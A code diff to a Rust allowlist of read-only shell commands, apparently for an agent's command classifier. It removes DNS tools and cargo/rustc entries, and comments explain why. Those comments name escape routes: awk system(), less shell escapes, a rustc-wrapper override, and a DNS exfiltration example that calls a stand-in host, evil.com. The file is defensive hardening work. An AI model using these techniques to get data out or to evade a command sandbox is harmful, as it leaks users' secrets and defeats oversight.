@@ -1,23 +1,30 @@
 //! The command lists classification matches against.
 
-// 父模块 OBVIOUSLY_SAFE_PROGRAMS 中已有的程序应同步加到这里。
-//
-// **进这个名单的门槛**：命令必须做到"不管带什么参数都不会
-// 写文件、不会执行别的程序"。只要存在一个参数能让它派生 shell，就不能进来 ——
-// `classify_single` 只对名字做匹配，参数层的兜底只有 `args_forfeit_read_only`
-// 那两条通用规则。因此不在名单里的：
+// **进这个名单的门槛**：命令必须做到"不管带什么参数都不会写文件、不会执行
+// 别的程序、不会向参数里的主机发请求"。参数层的兜底（`args_forfeit_read_only`）
+// 只认得列出来的那些选项，所以只要存在一种写法能让它派生 shell，就不能进来。
+// 因此不在名单里的：
 //
 // - `awk`：`awk 'BEGIN{system("...")}'` 直接执行任意命令，还有 `print > "file"`、
 //   `| "sh"` 等多条写/执行路径。想靠扫描 program text 里的 `system(` / `print >`
 //   把它捞回来并不稳（引号拼接、`ENVIRON`、`--source` 等绕法太多），干脆不收。
 //   `gawk` / `mawk` 同理。
 // - `less` / `more`：都支持 `!cmd` shell 逃逸（less 还有 `-s`/lesspipe）。
-// - `env`：它是命令**前缀**不是命令，由 `classify::SAFE_WRAPPERS` 剥掉后分类被
-//   包住的真命令。
+// - `env`：它是命令**前缀**不是命令，被它包住的真命令才是分类对象。光秃秃的
+//   `env` 会把环境变量整个倒进 transcript，也不算只读。
+// - `dig` / `ping` / `nslookup` / `traceroute`：按参数里的主机名发 DNS 查询，
+//   `nslookup <编码后的数据>.evil.com` 就把数据带出去了。
+// - `cargo metadata` / `cargo tree`：要问 rustc，而项目的 `.cargo/config.toml`
+//   能把 rustc 换成任意程序（`build.rustc-wrapper`）；`cargo` / `rustc
+//   --version` 与 `rustup show` 跑的是 `rust-toolchain.toml` 指定的工具链，
+//   它可以是一个路径。
 //
 // 留在名单里但受参数约束的：`find`（`-exec` 家族见 `FIND_UNSAFE_PREDICATES`）、
 // 以及所有会读文件的命令（`cat`/`head`/`tail`/`xxd`/`strings`/`od`/`hexdump`/
-// `bat`/`jq`/`grep`…）—— 参数指向凭据目录时由 `args_forfeit_read_only` 否决。
+// `bat`/`jq`/`grep`…）—— 参数指向凭据目录时整行不算只读。
+//
+// `command` 在名单里是因为它作为程序出现时只是在查名字（`command -v ls`）；
+// 它包住的命令（`command ls`）各按各的分类。
 pub(super) const READ_ONLY_COMMANDS: &[&str] = &[
     "ls",
     "find",
@@ -37,6 +44,7 @@ pub(super) const READ_ONLY_COMMANDS: &[&str] = &[
     "pwd",
     "which",
     "type",
+    "command",
     "true",
     "false",
     "uname",
@@ -67,9 +75,7 @@ pub(super) const READ_ONLY_COMMANDS: &[&str] = &[
     "info",
     "whatis",
     "apropos",
-    // 网络诊断（只读查询）
-    "nslookup",
-    "traceroute",
+    // 网络状态（只读本机）
     "netstat",
     "ss",
     // 文件比较
@@ -139,13 +145,7 @@ pub(super) const READ_ONLY_PREFIXES: &[&str] = &[
     "git stash list",
     "git tag",
     "git cherry",
-    // `cargo build` / `cargo check` are deliberately absent: both compile the
-    // crate, which runs its `build.rs` and proc-macros — arbitrary code.
-    "cargo metadata",
-    "cargo tree",
-    "cargo --version",
-    "cargo version",
-    "rustc --version",
+    // No `cargo` or `rustc` at all: see the note at the top of this file.
     "node --version",
     // 包管理查询
     "pip list",
@@ -156,7 +156,6 @@ pub(super) const READ_ONLY_PREFIXES: &[&str] = &[
     "brew info",
     "brew search",
     // Rustup 信息
-    "rustup show",
     "rustup toolchain list",
     // Docker 只读
     "docker ps",
